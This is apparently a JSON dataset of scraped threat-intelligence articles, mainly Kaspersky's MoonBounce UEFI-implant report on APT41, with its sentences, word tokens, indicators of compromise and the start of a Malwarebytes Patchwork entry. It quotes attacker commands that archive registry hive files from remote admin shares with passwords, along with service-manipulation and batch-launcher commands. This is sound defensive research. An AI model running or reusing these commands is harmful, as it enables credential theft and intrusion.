                "cmd /C \"C: & cd \\ & $temp\\rar.exe a -r wef.rar \\\\<redacted_internal_ip1>\\c$\\windows\\temp\\1 -hp2wsxcde34rfv7788.\"",
                "c:\\windows\\temp\\rar.exe  a -r c:\\windows\\temp\\873.rar \\\\<redacted_internal_ip2>\\c$\\windows\\temp\\*.hive -hp5tgbnhy67ujm3256",
                "cmd /C \"C: & cd \\ & $temp\\rar.exe a -r wef.rar \\\\<redacted_internal_ip1>\\c$\\windows\\temp\\1 -hp2wsxcde34rfv7788.",
                "The main cluster of infrastructure serving the activity of the UEFI implant and ScrambleCross implants is outlined in the table below.",
                "Note that the attackers maintained the infrastructure from at least March 2020, with some servers seemingly still active at the end of 2021 .",
                "During the time the actor switched between multiple hosting providers, resulting in a scattered infrastructure across several ASNs.",
                "A careful inspection of the infrastructure shows multiple connections between the servers.",
                "It is evident that MoonBounce’s user-mode stager and a few ScrambleCross instances reached out to a single domain, which resolved to the same IP at one point.",
                "In addition, there were several overlaps in IPs to which the domains resolved as outlined in the figure below, including one IP that was used to park two domains at different points in time.",
                "Connections between infrastructure elements of MoonBounce and ScrambleCross implants found on the same network",
                "Another important commonality is a unique self-signed SSL certificate, exhibited by multiple servers in this campaign (and only a few dozen others in the wild), which represents a noteworthy fingerprint of the attacker’s network activity.",
                "In addition to the above cluster, we detected two servers related to Microcin’s activity on the same network:",
                "Who is behind the MoonBounce attack?",
                "To the best of our knowledge, the activity described in this report can be attributed to a group widely known as APT41, or an actor closely affiliated to it, with medium to high confidence.",
                "In part, our findings align with multiple public accounts from the previous year of either APT41 or other threat actors, namely Earth Baku and SparklingGoblin, which are believed to be alternative names for APT41 or share significant resources and TTPs with it.",
                "Our conclusion, in particular, is done based on the following factors:",
                "The loading schemes for ScrambleCross, including the usage of StealthVector and StealthMutant in the infection chain, are identical to those observed leveraged by Earth Baku and SparklingGoblin.",
                "Apart from the loaders themselves, their launchers seem identical.",
                "The attackers used the unique TTP of initiating the loader execution through exe in all cases observed by us.",
                "Particularly Install.bat, as used by Earth Baku and described in the public report by Trend Micro mentioned earlier, is highly similar to the sequence of commands used to execute the InstallUtil launcher in our case.",
                "The ScrambleCross malware itself, which has been reported in use with both Earth Baku and SparklingGoblin, is considered a variant of CROSSWALK, a piece of malware that was described originally by Mandiant as an APT41 tool and remains distinct to the group, to the best of our knowledge.",
                "A unique certificate retrieved from multiple ScrambleCross C2 servers in the campaign described in this report was sent as a response in a few other dozen servers in the wild, a few of them have been previously reported by the FBI as being part of an APT41-owned infrastructure.",
                "Additionally, the following observations are worth mentioning:",
                "The user-mode malware stager deployed by the UEFI implant contains a scheduling logic that is somewhat similar to one seen in Microcin samples (some of which were also found on infected hosts in this campaign).",
                "This suggests that these groups may be related through shared resources or a prime contractor.",
                "The said scheduling algorithm found in the stager can take a 672-bit bitmask to determine when the malware should start beaconing the C2 server in an attempt to retrieve the payload, whereby the scheduled working time can be decided in a granularity of 15-minute slots (i.e.",
                "the stager checks if it is supposed to run in a particular slot out of the 672 possibilities that constitute a full week, or alternatively sleep for 10 seconds before checking if it has reached a dedicated working slot again).",
                "A similar scheduling methodology occurs in the case of Microcin, but with a bitmask that simply represents the days of the week on which the malware ought to be active.",
                "Scheduling code used in MoonBounce’s user-mode stager",
                "The Mimikat_ssp tool found on a few machines in the targeted network has been seen in use by multiple Chinese-speaking threat actors in the past.",
                "One recent example is its use in the campaigns of GhostEmperor, as described in a previous report.",
                "Some elements of shellcode leveraged in MoonBounce were spotted in an old rootkit that was part of a malicious framework dubbed xTalker, which has been seen in the wild since at least 2013, alongside several malware families affiliated to known actors, e.g.",
                "It was prominently used against Russian-speaking targets including military, governmental entities and think-tanks.",
                "Both components shared a similar name-hashing algorithm, which is outlined below, along with unique corresponding function name hashes (e.g.",
                "0x311B83F, the name hash of ExAllocatePool) that were not seen in use elsewhere in the wild.",
                "Name-hashing algorithm used identically in both MoonBounce and xTalker’s rootkit",
                "In addition, both pieces of code used a technique of replacing magic marker values within shellcode buffers with pointer addresses during runtime.",
                "MoonBounce’s code used the marker 0x1122334455667788, while the xTalker rootkit’s code used 0x1234567812345678.",
                "Magic marker values replaced during execution within shellcodes in xTalker’s rootkit and MoonBounce",
                "In the case of xTalker, the above code elements were found within shellcode intended to be staged through an MBR bootkit.",
                "However, it is not clear to what extent it was actually used.",
                "This may suggest that the MoonBounce and xTalker codes were authored by the same, or a closely affiliated, developer.",
                "In September 2020, the US Department of Justice released a series of indictments against members of the APT41 group, charging them with a high number of computer intrusions against a variety of targets, both in the private and public sectors, some of which included high-profile supply chain attacks.",
                "The intrusion set described in this report, and in other public accounts we referred to, shows that the group did not cease to be active despite these legal proceedings.",
                "Moreover, it is evident that the group maintains a high level of proficiency and sophistication in the development of its toolset, gaining a foothold in new areas like UEFI firmware.",
                "In this sense, the group has introduced its own innovation to this landscape",
                "patching an existing benign core component in the firmware (rather than adding a new driver to it), thereby turning the UEFI firmware into a highly stealthy and persistent storage for malware in the system.",
                "Following previous predictions, we can now say that UEFI threats are gradually becoming a norm.",
                "With this in mind, vendors are taking more precautions to mitigate attacks like MoonBounce, for example by enabling Secure Boot by default.",
                "We assess that, in this ongoing arms race, attacks against UEFI will continue to proliferate, with attackers evolving and finding ways to exploit and bypass current security measures.",
                "As a safety measure against this attack and similar ones, it is recommended to update the UEFI firmware regularly and verify that BootGuard, where applicable, is enabled.",
                "Likewise, enabling Trust Platform Modules, in case a corresponding hardware is supported on the machine, is also advisable.",
                "On top of all, a security product that has visibility into the firmware images should add an extra layer of security, alerting the user on a potential compromise if such occurs.",
                "System.Mail.Service.dll",
                "InstallUtil launcher for StealthMutant",
                "schtask.bat",
                "Batch launcher for StealthMutant",
                "MoonBounce: the dark side of UEFI firmware",
                "Your email address will not be published.",
                "Required fields are marked *Name *",
                "Did you verify the effected systems not have BootGuard and/or TPM authentication enabled?",
                "The affected system did not support neither BootGuard nor TPM.",
                "How do the attackers “place” it on the SPI flash in the first place?",
                "We don’t have sufficient information as to how writing to the SPI flash happened, however we estimate that it was done through remote access to the machine, not physical access to the hardware.",
                "What happened?Revisiting the current state of the art in persistent attacksOur discovery: a sophisticated implant within UEFI firmwareOther pieces of malware on the radarWho were the targets?What were the attackers trying to achieve?Network infrastructureWho is behind the MoonBounce attack?ConclusionMoonBounce’ indicators of compromise",
                "Powered by SAS: malware attribution and next-gen IoT honeypots",
                "Powered by SAS: threat actors advance on new fronts",
                "Powered by SAS: threat hunting and new techniques",
                "GhostEmperor: From ProxyLogon to kernel mode",
                "LuminousMoth APT: Sweeping attacks for the chosen few",
                "The hottest research right in your inbox",
                "I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site.",
                "I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.",
                "The BlueNoroff cryptocurrency hunt is still on",
                "ScarCruft surveilling North Korean defectors and human rights activists",
                "WIRTE’s campaign in the Middle East ‘living off the land’ since at least 2019",
                "Telehealth: A New Frontier in Medicine—and Security",
                "MoonBounce: the dark side of UEFI firmware",
                "Campaigns abusing corporate trusted infrastructure hunt for corporate credentials on ICS networks",
                "The BlueNoroff cryptocurrency hunt is still on",
                "CCB Q4 2021 event: Insights about the details of the Log4Shell attack",
                "CCB Q4 2021 event: Elaborating on the BlueNoroff’s cryptocurrency hunt",
                "ATM & PoS threat landscape: evolution and COVID-19 lockdown impact",
                "The Log4Shell Vulnerability",
                "explained: how to stay secure",
                "MoonBounce: the dark side of UEFI firmware",
                "At the end of 2021, we inspected UEFI firmware that was tampered with to embed a malicious code we dub MoonBounce.",
                "In this report we describe how the MoonBounce implant works and how it is connected to APT41.",
                "The BlueNoroff cryptocurrency hunt is still on",
                "It appears that BlueNoroff shifted focus from hitting banks and SWIFT-connected servers to solely cryptocurrency businesses as the main source of the group’s illegal income.",
                "ScarCruft surveilling North Korean defectors and human rights activists",
                "The ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor.",
                "Recently, we had an opportunity to perform a deeper investigation on a host compromised by this group.",
                "WIRTE’s campaign in the Middle East ‘living off the land’ since at least 2019",
                "In this report we provide details on a malicious VBS implant distributed via MS Excel droppers and a fake “Kaspersky Update Agent” which we attribute to WIRTE APT who may be linked to Gaza Cybergang.",
                "The hottest research right in your inbox",
                "I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site.",
                "I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.",
                "Registered trademarks and service marks are the property of their respective owners.",
                "The hottest research right in your inbox",
                "I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site.",
                "I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above."
            ],
            "sentencesNum": 260,
            "words": [
                "Solutions for:",
                "Home Products",
                "Small Business 1-50 employees",
                "Medium Business 51-999 employees",
                "Enterprise 1000+ employees",
                "by Kaspersky",
                "CompanyAccount",
                "Get In Touch",
                "Dark mode off",
                "EnglishRussianSpanish",
                "Solutions",
                "Hybrid Cloud SecurityLearn More",
                "Threat Management and DefenseLearn More",
                "Industrial CybersecurityLearn More",
                "Fraud PreventionLearn More",
                "Other solutions",
                "Blockchain Security",
                "Kaspersky for Security Operations Center",
                "Industries",
                "National CybersecurityLearn More",
                "Industrial CybersecurityLearn More",
                "Finance Services CybersecurityLearn More",
                "Healthcare CybersecurityLearn More",
                "Transportation CybersecurityLearn More",
                "Retail CybersecurityLearn More",
                "Other Industries",
                "Telecom Cybersecurity",
                "Blockchain Security",
                "View all",
                "Products",
                "KasperskyEndpoint Security for BusinessLearn More",
                "KasperskyEDR OptimumLearn More",
                "KasperskyAnti Targeted Attack PlatformLearn More",
                "KasperskyManaged Detection and ResponseLearn More",
                "KasperskySandboxLearn More",
                "Other Products",
                "Kaspersky Security for Mail Server",
                "Kaspersky Security for Internet Gateway",
                "Kaspersky Embedded Systems Security",
                "View All",
                "Services",
                "KasperskyCybersecurity ServicesLearn More",
                "KasperskyAdaptive Online TrainingLearn More",
                "KasperskyPremium SupportLearn More",
                "KasperskyThreat IntelligenceLearn More",
                "KasperskyAPT Intelligence ReportingLearn More",
                "KasperskyTargeted Attack DiscoveryLearn More",
                "Other Services",
                "Kaspersky Professional Services",
                "Kaspersky Incident Response",
                "Kaspersky Cybersecurity Training",
                "Kaspersky Incident Communications",
                "Kaspersky Security Awareness",
                "View All",
                "Resource Center",
                "Case Studies",
                "White Papers",
                "Datasheets",
                "Technologies",
                "MITRE ATT&CK",
                "About Us",
                "Transparency",
                "Corporate News",
                "Press Center",
                "Careers",
                "Innovation Hub",
                "Sponsorship",
                "Policy Blog",
                "Contacts",
                "GDPR",
                "Subscribe",
                "Dark mode off",
                "Login",
                "Securelist menu",
                "EnglishRussianSpanish",
                "Home Users",
                "Products",
                "KasperskyTotal Security",
                "KasperskyInternet Security",
                "KasperskyAnti-Virus",
                "KasperskyInternet Security for Mac",
                "Kaspersky Internet Security for Android",
                "KasperskySecure Connection",
                "Free Tools",
                "Kaspersky Safe Kids",
                "Kaspersky Password Manager",
                "Kaspersky Software Updater",
                "View more",
                "Renew",
                "Downloads",
                "Support",
                "Resource Center",
                "My Kaspersky",
                "My Devices",
                "My Products / Subscriptions",
                "My Orders",
                "Small Business(1-50 employees)",
                "Products",
                "KasperskySmall Office Security",
                "KasperskyEndpoint Security Cloud",
                "KasperskyEndpoint Security for Business Select",
                "KasperskyEndpoint Security for Business Advanced",
                "Renew",
                "Downloads",
                "Support",
                "Resource Center",
                "Insights",
                "Products & Solutions",
                "Customer Stories",
                "Awards & Recognition",
                "Technology",
                "GDPR",
                "KSOS Portal",
                "Medium Business(51-999 employees)",
                "Products",
                "KasperskyEndpoint Security Cloud",
                "KasperskySecurity for Office 365",
                "KasperskyEndpoint Security for Business Select",
                "KasperskyEndpoint Security for Business Advanced",
                "KasperskySecurity for Business Total",
                "TARGETED SECURITY SOLUTIONS",
                "Mail Server",
                "File Server",
                "Mobile",
                "Internet Gateway",
                "Virtualization and Hybrid Cloud",
                "Collaboration",
                "Vulnerability and Patch Management",
                "Storage",
                "View More",
                "Services",
                "Downloads",
                "Support",
                "Resource Center",
                "Insights",
                "Products & Solutions",
                "Customer Stories",
                "Awards & Recognition",
                "Technology",
                "GDPR",
                "CompanyAccount",
                "Enterprise(1000+ employees)",
                "Solutions",
                "Endpoint Security",
                "Hybrid Cloud Security",
                "Threat Management and Defense",
                "Industrial Cybersecurity",
                "Fraud Prevention",
                "Industries",
                "National Cybersecurity",
                "Industrial Cybersecurity",
                "Finance Services Cybersecurity",
                "Healthcare Cybersecurity",
                "Transportation Cybersecurity",
                "Retail Cybersecurity",
                "Other industries",
                "Telecom Cybersecurity",
                "View all",
                "Products",
                "KasperskyEndpoint Security",
                "KasperskyEndpoint Detection and Response",
                "KasperskyHybrid Cloud Security",
                "KasperskyAnti Targeted Attack Platform",
                "KasperskyPrivate Security Network",
                "KasperskyEmbedded Systems Security",
                "Other products",
                "Kaspersky Security for Mail Server",
                "Kaspersky DDoS Protection",
                "Kaspersky Mobile Security",
                "Kaspersky Security for Storage",
                "View all",
                "Services",
                "KasperskyCybersecurity Services",
                "KasperskySecurity Awareness",
                "KasperskyPremium Support",
                "KasperskyThreat Intelligence",
                "KasperskyTargeted Attack Discovery",
                "KasperskyIncident Response",
                "Other Services",
                "Kaspersky Professional Services",
                "Kaspersky Security Assessment",
                "Kaspersky Security Training",
                "Kaspersky Advanced Cyber Incident Communications",
                "View all",
                "Resource Center",
                "Case Studies",
                "White Papers",
                "Datasheets",
                "Technologies",
                "Contact Us",
                "GDPR",
                "CompanyAccount",
                "Securelist",
                "Threats",
                "Financial threats",
                "Mobile threats",
                "Web threats",
                "Secure environment (IoT)",
                "Vulnerabilities and exploits",
                "Spam and Phishing",
                "Industrial threats",
                "Categories",
                "APT reports",
                "Incidents",
                "Research",
                "Malware reports",
                "Spam and phishing reports",
                "Publications",
                "Kaspersky Security Bulletin",
                "Archive",
                "All Tags",
                "APT Logbook",
                "Webinars",
                "Statistics",
                "Encyclopedia",
                "Threats descriptions",
                "KSB 2020",
                "Partners",
                "Partners",
                "Find a Partner",
                "Affiliate",
                "Technology",
                "Whitelist Program",
                "About Us",
                "About Us",
                "Company",
                "Team",
                "Transparency",
                "Transparency Center",
                "Policy Blog",
                "Corporate News",
                "Press Center",
                "Careers",
                "Incubator",
                "Sponsorships",
                "Content menu",
                "Close",
                "Subscribe",
                "by Kaspersky",
                "Dark mode off",
                "ThreatsThreats",
                "APT (Targeted attacks)",
                "Secure environment (IoT)",
                "Mobile threats",
                "Financial threats",
                "Spam and phishing",
                "Industrial threats",
                "Web threats",
                "Vulnerabilities and exploits",
                "CategoriesCategories",
                "APT reports",
                "Malware descriptions",
                "Security Bulletin",
                "Malware reports",
                "Spam and phishing reports",
                "Security technologies",
                "Research",
                "Publications",
                "Other sections",
                "Archive",
                "All tags",
                "Webinars",
                "APT Logbook",
                "Statistics",
                "Encyclopedia",
                "Threats descriptions",
                "KSB 2021",
                "APT reports",
                "APT reports",
                "20 Jan 2022",
                "minute read",
                "Table of Contents",
                "Authors",
                "Mark Lechtik",
                "Vasily Berdnikov",
                "Denis Legezo",
                "Ilya Borisov",
                "What happened?",
                "Loader Filename",
                "Loader MD5",
                "Shellcode Filename",
                "C&C Address",
                "Compilation Timestamp",
                "wbwkem.dll",
                "4D5EB9F6F501B4F6EDF981A3C6C4D6FA",
                "compwm.bin",
                "dev.kinopoisksu[.]com",
                "Friday, 12.06.2020 08:25:02 UTC",
                "wkbem.dll",
                "E7155C355C90DC113476DDCF765B187D",
                "pcomnl.bin",
                "Unknown",
                "Tuesday, 24.03.2020 09:09:21 UTC",
                "wmiwk.dll",
                "899608DE6B59C63B4AE219C3C13502F5",
                "wmipl.dll",
                "ns.glbaitech[.]com",
                "Saturday, 20.02.2021 06:45:18 UTC",
                "c_20344.nls",
                "4EF90CEEF2CC9FF3121B34A9891BB28D",
                "–",
                "217.69.10[.]104",
                "Tuesday, 24.03.2020 09:09:21 UTC",
                "c_20334.nls",
                "CFF2772C44F6F86661AB0A4FFBF86833",
                "–",
                "st.kinopoisksu[.]com",
                "Tuesday, 24.03.2020 09:09:21 UTC",
                "net  start \"iscsiwmi\"",
                "sc  stop iscsiwmi",
                "sc  delete iscsiwmi",
                "reg  add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\iscsiwmi\\Parameters\" /f",
                "net  start \"iscsiwmi\"",
                "12345678910",
                "1",
                "@echo off",
                "cd /d \"%~dp0\"",
                "copy /Y Microsoft.Service.Watch.targets \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Service.Watch.targets\"",
                "copy /Y MstUtil.exe.config \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MstUtil.exe.config\"",
                "schtasks /run /TN \"\\Microsoft\\Windows\\UNP\\UNPRefreshListTask\"",
                "123456",
                "Loader MD5",
                "C&C Address",
                "Compilation Timestamp",
                "0603C8AAECBDC523CBD3495E93AFB20C",
                "92.38.178[.]246",
                "Tuesday, 23.03.2021 08:00:44 UTC",
                "ns.glbaitech[.]com",
                "8C7598061D1E8741B8389A80BFD8B8F5",
                "ns.glbaitech[.]com",
                "Saturday, 20.02.2021 03:27:42 UTC",
                "F9F9D6FB3CB94B1CDF9E437141B59E16",
                "ns.glbaitech[.]com",
                "Wednesday, 08.12.2021 07:07:28 UTC",
                "GhostEmperor, which we reported on).",
                "Initialising communications with the server;",
                "Get list of drives;",
                "Run a shell command.",
                "Who were the targets?",
                "Other affiliated malicious samples (e.g.",
                "1234567891011121314",
                "123",
                "123",
                "1234567",
                "12345",
                "12",
                "\"c:\\windows\\temp\\rar.exe  a -r c:\\windows\\temp\\873.rar \\\\<redacted_internal_ip2>\\c$\\windows\\temp\\*.hive -hp5tgbnhy67ujm3256",
                "Network infrastructure",
                "Domain",
                "IP",
                "ASN",
                "mb.glbaitech[.]com",
                "188.166.61[.]146",
                "AS14061",
                "DIGITALOCEAN-ASN",
                "ns.glbaitech[.]com",
                "188.166.61[.]146",
                "AS14061",
                "DIGITALOCEAN-ASN",
                "172.107.231[.]236",
                "AS40676",
                "dev.kinopoisksu[.]com",
                "172.107.231[.]236",
                "AS40676",
                "193.29.57[.]161",
                "AS48314",
                "IP-PROJECTS",
                "st.kinopoisksu[.]com",
                "136.244.100[.]127",
                "AS20473",
                "AS-CHOOPA",
                "–",
                "217.69.10[.]104",
                "AS20473",
                "AS-CHOOPA",
                "–",
                "92.38.178[.]246",
                "AS202422",
                "GHOST",
                "Domain",
                "IP",
                "ASN",
                "m.necemarket[.]com",
                "172.105.94[.]67",
                "AS63949",
                "LINODE",
                "holdmem.dbhubspi[.]com",
                "5.188.93[.]132",
                "AS202422",
                "G-Core Labs",
                "NetTraveler, Enfal and Microcin.",
                "Conclusion",
                "MoonBounce’ indicators of compromise",
                "EFI Rootkit",
                "Malicious CORE_DXE",
                "D94962550B90DDB3F80F62BD96BD9858",
                "Modified WMI DLL Launcher",
                "C3B153347AED27435A18E789D8B67E0A",
                "StealthVector",
                "4D5EB9F6F501B4F6EDF981A3C6C4D6FA",
                "E7155C355C90DC113476DDCF765B187D",
                "899608DE6B59C63B4AE219C3C13502F5",
                "4EF90CEEF2CC9FF3121B34A9891BB28D",
                "CFF2772C44F6F86661AB0A4FFBF86833",
                "InstallUtil Launcher",
                "5F9020983A61446A77AF1976247C443D",
                "StealthMutant",
                "0603C8AAECBDC523CBD3495E93AFB20C",
                "8C7598061D1E8741B8389A80BFD8B8F5",
                "F9F9D6FB3CB94B1CDF9E437141B59E16",
                "Microcin",
                "5FE6CE9C48D0AE98EC2CA1EC9759AAD9",
                "50FF717A8E3106DDBF00FB42212879C5",
                "D98614600775781673B6DF397CC4F476",
                "Go Implant",
                "C9B250099E2DD27BB4170836AC480FE0",
                "97EF7B8FCDCB0C0D9FBB93D0F7E6E3B6",
                "Mimikat_SSP",
                "4E4388D7967E0433D400C60475974D50",
                "5F1C7602688E67F299F5BD533FA07880",
                "xTalker Rootkit",
                "45E862964EF4EFDEA181F3927D20E96D",
                "4BC82105403974AA24BF02CFB66B8F7C",
                "Domains and IPs",
                "mb.glbaitech[.]com",
                "MoonBounce",
                "ns.glbaitech[.]com",
                "ScrambleCross",
                "dev.kinopoisksu[.]com",
                "ScrambleCross",
                "st.kinopoisksu[.]com",
                "ScrambleCross",
                "188.166.61[.]146 ",
                "ScrambleCross",
                "172.107.231[.]236",
                "ScrambleCross",
                "193.29.57[.]161",
                "ScrambleCross",
                "136.244.100[.]127",
                "ScrambleCross",
                "217.69.10[.]104",
                "ScrambleCross",
                "92.38.178[.]246",
                "ScrambleCross",
                "m.necemarket[.]com",
                "Microcin",
                "172.105.94[.]67",
                "Microcin",
                "holdmem.dbhubspi[.]com",
                "Microcin",
                "5.188.93[.]132",
                "Go malware",
                "5.189.222[.]33",
                "Go malware",
                "5.183.103[.]122",
                "Go malware",
                "5.188.108[.]228",
                "Go malware",
                "45.128.132[.]6",
                "Go malware",
                "92.223.105[.]246",
                "Go malware",
                "5.183.101[.]21",
                "Go malware",
                "5.183.101[.]114",
                "Go malware",
                "45.128.135[.]15",
                "Go malware",
                "5.188.108[.]22",
                "Go malware",
                "70.34.201[.]16",
                "Go malware",
                "File Names",
                "wbwkem.dll",
                "StealthVector",
                "wkbem.dll",
                "StealthVector",
                "wmiwk.dll",
                "StealthVector",
                "C_20344.nls",
                "StealthVector",
                "C_20334.nls",
                "StealthVector",
                "compwm.bin",
                "ScrambleCross Shellcode",
                "pcomnl.bin",
                "ScrambleCross Shellcode",
                "wmipl.dll",
                "ScrambleCross encrypted shellcode",
                "Microsoft.Service.Watch.targets",
                "StealthMutant",
                "MstUtil.exe.config",
                "ScrambleCross encrypted shellcode",
                "CmluaApi.dll",
                "Microcin",
                "ScrambleCross Mutexes",
                "Global\\GouZUAkmtdpUmves",
                "Global\\PtUojBxCOZGVmQQn",
                "Global\\EGuUCpyYIJRTQJAV",
                "Global\\YCtiqMgRrpLGbfDo",
                "APT",
                "Chinese-speaking cybercrime",
                "Firmware",
                "Malware Descriptions",
                "Malware Technologies",
                "Microcin",
                "MoonBounce",
                "Rootkits",
                "UEFI",
                "Authors",
                "Mark Lechtik",
                "Vasily Berdnikov",
                "Denis Legezo",
                "Ilya Borisov",
                "Email *",
                "Cancel",
                "Δ",
                "SecurityMonk",
                "Posted on\t\t\t\t\t\t\tJanuary 20, 2022.",
                "5:43 pm",
                "Reply",
                "Securelist",
                "Posted on\t\t\t\t\t\t\tJanuary 27, 2022.",
                "2:58 pm",
                "Reply",
                "Mark Jacobs",
                "Posted on\t\t\t\t\t\t\tJanuary 21, 2022.",
                "2:05 pm",
                "Physical access to the hardware?",
                "Reply",
                "Securelist",
                "Posted on\t\t\t\t\t\t\tJanuary 27, 2022.",
                "2:58 pm",
                "Reply",
                "Table of Contents",
                "GReAT webinars",
                "13 May 2021, 1:00pm",
                "GReAT Ideas.",
                "Balalaika Edition",
                "Boris Larin",
                "Denis Legezo",
                "26 Feb 2021, 12:00pm",
                "GReAT Ideas.",
                "Green Tea Edition",
                "John Hultquist",
                "Brian Bartholomew",
                "Suguru Ishimaru",
                "Vitaly Kamluk",
                "Seongsu Park",
                "Yusuke Niwa",
                "Motohiko Sato",
                "17 Jun 2020, 1:00pm",
                "GReAT Ideas.",
                "Marco Preuss",
                "Denis Legezo",
                "Costin Raiu",
                "Kurt Baumgartner",
                "Dan Demeter",
                "Yaroslav Shmelev",
                "26 Aug 2020, 2:00pm",
                "GReAT Ideas.",
                "Ivan Kwiatkowski",
                "Maher Yamout",
                "Noushin Shabab",
                "Pierre Delcher",
                "Félix Aime",
                "Giampaolo Dedola",
                "Santiago Pontiroli",
                "22 Jul 2020, 2:00pm",
                "GReAT Ideas.",
                "Dmitry Bestuzhev",
                "Costin Raiu",
                "Pierre Delcher",
                "Brian Bartholomew",
                "Boris Larin",
                "Ariel Jungheit",
                "Fabio Assolini",
                "From the same authors",
                "Lyceum group reborn",
                "WildPressure targets the macOS platform",
                "Operation TunnelSnake",
                "Subscribe to our weekly e-mails",
                "Email*",
                "*",
                "Subscribe",
                "Δ",
                "In the same category",
                "APT trends report Q3 2021",
                "Lyceum group reborn",
                "Latest Posts",
                "Publications",
                "Maria Namestnikova",
                "APT reports",
                "Mark Lechtik",
                "Vasily Berdnikov",
                "Denis Legezo",
                "Ilya Borisov",
                "Research",
                "Kirill Kruglov",
                "APT reports",
                "Seongsu Park",
                "Vitaly Kamluk",
                "Latest Webinars",
                "Cyberthreat talks",
                "13 Jan 2022, 10:00am",
                "Costin Raiu",
                "Markus Neis",
                "Cyberthreat talks",
                "13 Jan 2022, 10:00am",
                "Seongsu Park",
                "Cyberthreat talks",
                "18 Jan 2022, 5:00pm",
                "Dmitry Bestuzhev",
                "Oleg Gorobets",
                "Cyberthreat talks",
                "17 Dec 2021, 4:00pm",
                "Marco Preuss",
                "Marc Rivero",
                "Dan Demeter",
                "Reports",
                "Subscribe to our weekly e-mails",
                "Email*",
                "*",
                "Subscribe",
                "Δ",
                "ThreatsThreats",
                "APT (Targeted attacks)",
                "Secure environment (IoT)",
                "Mobile threats",
                "Financial threats",
                "Spam and phishing",
                "Industrial threats",
                "Web threats",
                "Vulnerabilities and exploits",
                "CategoriesCategories",
                "APT reports",
                "Malware descriptions",
                "Security Bulletin",
                "Malware reports",
                "Spam and phishing reports",
                "Security technologies",
                "Research",
                "Publications",
                "Other sections",
                "Archive",
                "All tags",
                "Webinars",
                "APT Logbook",
                "Statistics",
                "Encyclopedia",
                "Threats descriptions",
                "KSB 2021",
                "© 2022 AO Kaspersky Lab.",
                "All Rights Reserved.",
                "Privacy Policy",
                "License Agreement",
                "Cookies",
                "Subscribe to our weekly e-mails",
                "Email*",
                "*",
                "Subscribe",
                "Δ"
            ],
            "wordsNum": 662,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2022-01-07",
            "from_website": "MalwareBytes",
            "title": "Patchwork APT caught in its own web",
            "from_url": "https://blog.malwarebytes.com/threat-intelligence/2022/01/patchwork-apt-caught-in-its-own-web/",
            "content": [
                "Patchwork APT caught in its own web | Malwarebytes Labs",
                "The official Malwarebytes logo in a blue font",
                "Protect your devices, your data, and your privacy—at home or on the go.",
                "Endpoint Detection & Response for Servers",
                "CLOUD-BASED SECURITY MANAGEMENT AND SERVICES PLATFORM",
                "Find the right solution for your business",
                "See what Malwarebytes can do for you",
                "Our team is ready to help.",
                "\"Thanks to the Malwarebytes MSP program, we have this high-quality product in our stack.",
                "It’s a great addition, and I have confidence that customers’ systems are protected.\"",
                "Activate Malwarebytes Privacy on Windows device.",
                "Level Up to Cloud-Based Business Protection.",
                "Patchwork APT caught in its own web",
                "Posted: January 7, 2022 by Threat Intelligence Team",
                "The Patchwork APT, an Indian group targeting Pakistan exposes themselves with their own RAT",
                "Patchwork is an Indian threat actor that has been active since December 2015 and usually targets Pakistan via spear phishing attacks.",
                "In its most recent campaign from late November to early December 2021, Patchwork has used malicious RTF files to drop a variant of the BADNEWS (Ragnatela) Remote Administration Trojan (RAT).",
                "What is interesting among victims of this latest campaign, is that the actor has for the first time targeted several faculty members whose research focus is on molecular medicine and biological science.",
                "Instead of focusing entirely on victimology, we decided to shade some light on this APT.",
                "Ironically, all the information we gathered was possible thanks to the threat actor infecting themselves with their own RAT, resulting in captured keystrokes and screenshots of their own computer and virtual machines.",
                "We identified what we believe is a new variant of the BADNEWS RAT called Ragnatela being distributed via spear phishing emails to targets of interest in Pakistan.",
